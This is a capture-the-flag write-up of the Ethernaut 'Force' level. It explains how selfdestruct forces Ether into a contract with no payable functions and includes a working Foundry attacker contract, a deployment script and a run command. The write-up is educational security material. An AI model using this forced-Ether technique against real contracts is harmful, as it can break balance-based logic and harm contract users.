---
title: 'Force - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level7.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-18
lastmod: 2025-09-18
---

## Challenge Overview

This level presents a contract with no payable functions, making it seemingly impossible to send Ether to it through normal means. The goal is to make the contract's balance greater than zero by forcing Ether into it using an unconventional method.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

The contract contains no functions whatsoever - not even a fallback or receive function. This means:

1. No direct Ether transfers can be made to the contract
2. No function calls can be made to the contract
3. The contract cannot receive Ether through normal transactions

---

## Exploit Explanation

The solution leverages a low-level Ethereum feature: the `selfdestruct` operation. When a contract self-destructs, it can specify a recipient address to receive any remaining Ether in its balance. Crucially, this transfer **cannot be refused** by the recipient contract - it happens at the EVM level, bypassing any Solidity-level checks.

The exploit involves:
1. Creating an attacker contract with a payable function to receive Ether
2. Funding the attacker contract with a small amount of Ether
3. Calling `selfdestruct(target)` on the attacker contract, forcing all its Ether to the target contract

This works because:
- `selfdestruct` is an EVM opcode that forcibly sends Ether
- The recipient contract has no ability to reject this transfer
- It bypasses the need for payable functions or fallback/receive functions

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Force.sol";

contract Attacker {
    // Allow this contract to receive Ether
    receive() external payable {}

    function attack(address payable _target) public {
        // Self-destruct and force all Ether to target
        selfdestruct(_target);
    }
}

contract ForceSolution is Script {
    Force public forceInstance = Force(payable(<YOUR_INSTANCE>));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Check initial balance of target contract
        uint256 initialBalance = address(forceInstance).balance;
        console.log("Initial target balance:", initialBalance, "wei");
        
        // Deploy attacker contract
        Attacker attacker = new Attacker();
        
        // Send a small amount of Ether to the attacker contract
        (bool success, ) = address(attacker).call{value: 0.0001 ether}("");
        require(success, "Failed to fund attacker contract");
        
        // Execute the attack - force Ether into target contract
        attacker.attack(payable(address(forceInstance)));
        
        // Verify the attack was successful
        uint256 finalBalance = address(forceInstance).balance;
        console.log("Final target balance:", finalBalance, "wei");
        console.log("Attack successful:", finalBalance > initialBalance);
        
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/ForceSolution.s.sol --rpc-url $SEPOLIA_URL --tc ForceSolution --broadcast
```